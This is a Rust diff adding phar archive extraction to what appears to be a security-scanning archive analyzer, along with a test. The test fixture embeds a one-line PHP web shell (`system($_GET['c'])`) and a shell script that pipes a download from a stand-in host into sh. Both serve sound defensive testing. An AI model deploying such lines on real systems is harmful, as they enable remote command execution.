@@ -2032,7 +2032,9 @@ impl ArchiveAnalyzer {
         // dropped from the report, so a name-matching rule would never see the
         // lure that named it. The extraction pass merges its own per-member
         // metadata onto these entries by path rather than appending duplicates.
-        if is_zip_container(file_type) || matches!(file_type, FileType::Iso | FileType::Cpio) {
+        if is_zip_container(file_type)
+            || matches!(file_type, FileType::Iso | FileType::Cpio | FileType::Phar)
+        {
             report.archive_contents.extend(
                 filefacts_archive_entries
                     .iter()
@@ -2094,8 +2096,24 @@ impl ArchiveAnalyzer {
             return Ok(report);
         }
 
-        if matches!(file_type, FileType::Asar) {
-            self.analyze_asar_archive_in_memory(data, archive_path, &mut report, start, &guard)?;
+        if matches!(file_type, FileType::Asar | FileType::Phar) {
+            if file_type == FileType::Phar {
+                self.analyze_phar_archive_in_memory(
+                    data,
+                    &mut report,
+                    start,
+                    &guard,
+                    &filefacts_archive_entries,
+                )?;
+            } else {
+                self.analyze_asar_archive_in_memory(
+                    data,
+                    archive_path,
+                    &mut report,
+                    start,
+                    &guard,
+                )?;
+            }
             let member_metadata = guard.take_member_metadata();
             if !member_metadata.is_empty() {
                 merge_archive_member_metadata(&mut report, member_metadata);
@@ -5525,6 +5543,141 @@ traits:
         assert_eq!(path1, path2);
     }
 
+    /// A native phar, built the way `ext/phar` lays one out: a stub ending in
+    /// `__HALT_COMPILER(); ?>`, a little-endian manifest, then each member's
+    /// stored or compressed bytes back to back. `(name, content, flags,
+    /// declared size, crc32)`; `None` takes the real value.
+    fn phar_bytes(members: &[(&str, Vec<u8>, u32, Option<u32>, Option<u32>)]) -> Vec<u8> {
+        let mut manifest = Vec::new();
+        manifest.extend_from_slice(&(members.len() as u32).to_le_bytes());
+        manifest.extend_from_slice(&[0x11, 0x00]); // API 1.1.0
+        manifest.extend_from_slice(&0u32.to_le_bytes()); // unsigned
+        manifest.extend_from_slice(&6u32.to_le_bytes());
+        manifest.extend_from_slice(b"t.phar");
+        manifest.extend_from_slice(&0u32.to_le_bytes()); // no metadata
+        let mut contents = Vec::new();
+        for (name, content, flags, declared, crc) in members {
+            let stored = match flags {
+                0x1000 => {
+                    let mut e = flate2::write::DeflateEncoder::new(
+                        Vec::new(),
+                        flate2::Compression::default(),
+                    );
+                    std::io::Write::write_all(&mut e, content).unwrap();
+                    e.finish().unwrap()
+                }
+                0x2000 => {
+                    let mut e =
+                        bzip2::write::BzEncoder::new(Vec::new(), bzip2::Compression::default());
+                    std::io::Write::write_all(&mut e, content).unwrap();
+                    e.finish().unwrap()
+                }
+                _ => content.clone(),
+            };
+            let mut real_crc = flate2::Crc::new();
+            real_crc.update(content);
+            manifest.extend_from_slice(&(name.len() as u32).to_le_bytes());
+            manifest.extend_from_slice(name.as_bytes());
+            manifest.extend_from_slice(&declared.unwrap_or(content.len() as u32).to_le_bytes());
+            manifest.extend_from_slice(&0u32.to_le_bytes()); // mtime
+            manifest.extend_from_slice(&(stored.len() as u32).to_le_bytes());
+            manifest.extend_from_slice(&crc.unwrap_or(real_crc.sum()).to_le_bytes());
+            manifest.extend_from_slice(&(flags | 0o644).to_le_bytes());
+            manifest.extend_from_slice(&0u32.to_le_bytes()); // no metadata
+            contents.extend_from_slice(&stored);
+        }
+        let mut phar = b"<?php echo 'stub'; __HALT_COMPILER(); ?>\r\n".to_vec();
+        phar.extend_from_slice(&(manifest.len() as u32).to_le_bytes());
+        phar.extend_from_slice(&manifest);
+        phar.extend_from_slice(&contents);
+        phar
+    }
+
+    /// Every phar member is read from the manifest's offsets and analyzed as
+    /// its own file, the stub included, whatever its compression; a member
+    /// that inflates past its declared size is refused, and a CRC mismatch is
+    /// noted without dropping the member.
+    #[test]
+    fn phar_members_are_extracted_in_memory() {
+        let temp_dir = tempfile::tempdir().unwrap();
+        let path = temp_dir.path().join("sample.phar");
+        let shell = b"#!/bin/sh\ncurl -s http://example.invalid/x | sh\n".to_vec();
+        std::fs::write(
+            &path,
+            phar_bytes(&[
+                (
+                    "bin/run.php",
+                    b"<?php system($_GET['c']);\n".to_vec(),
+                    0,
+                    None,
+                    None,
+                ),
+                (
+                    "lib/util.js",
+                    b"module.exports = (a) => a + 1;\n".to_vec(),
+                    0x1000,
+                    None,
+                    None,
+                ),
+                ("scripts/setup.sh", shell, 0x2000, None, None),
+                ("bomb.txt", vec![b'A'; 4096], 0x1000, Some(16), None),
+                (
+                    "bad-crc.txt",
+                    b"plain text member\n".to_vec(),
+                    0,
+                    None,
+                    Some(1),
+                ),
+            ]),
+        )
+        .unwrap();
+
+        let report = ArchiveAnalyzer::new().analyze(&path).unwrap();
+        assert!(
+            report
+                .metadata
+                .tools_used
+                .iter()
+                .any(|t| t == "in_memory_phar"),
+            "{:?}",
+            report.metadata.tools_used
+        );
+        let member = |name: &str| report.files.iter().find(|f| f.path == name);
+        for name in [
+            ".phar/stub.php",
+            "bin/run.php",
+            "lib/util.js",
+            "scripts/setup.sh",
+            "bad-crc.txt",
+        ] {
+            assert!(
+                member(name).is_some(),
+                "{name} missing: {:?}",
+                report.files.iter().map(|f| &f.path).collect::<Vec<_>>()
+            );
+        }
+        assert_eq!(member(".phar/stub.php").unwrap().file_type, "php");
+        assert_eq!(member("scripts/setup.sh").unwrap().file_type, "shell");
+        assert!(
+            member("bomb.txt").is_none(),
+            "an over-size member is not analyzed"
+        );
+
+        let notes: Vec<&str> = report
+            .findings
+            .iter()
+            .flat_map(|f| f.evidence.iter().map(|e| e.value.as_str()))
+            .collect();
+        assert!(
+            notes.iter().any(|n| n.starts_with("bomb.txt:")),
+            "{notes:?}"
+        );
+        assert!(
+            notes.iter().any(|n| n.contains("bad-crc.txt: CRC32")),
+            "{notes:?}"
+        );
+    }
+
     #[test]
     fn test_small_jar_uses_in_memory_selector() {
         #[allow(clippy::expect_used)]
@@ -6269,7 +6422,7 @@ traits:
         let dispatch = &source[dispatch_start..dispatch_end];
 
         // Handled ahead of the match, in `analyze_archive`.
-        let dedicated = ["Chm", "Asar"];
+        let dedicated = ["Chm", "Asar", "Phar"];
 
         // Mirrors `FileType::is_archive()`.
         let containers = [
@@ -6314,6 +6467,7 @@ traits:
             "Xbps",
             "GentooBinpkg",
             "Asar",
+            "Phar",
             "Jar",
         ];
 
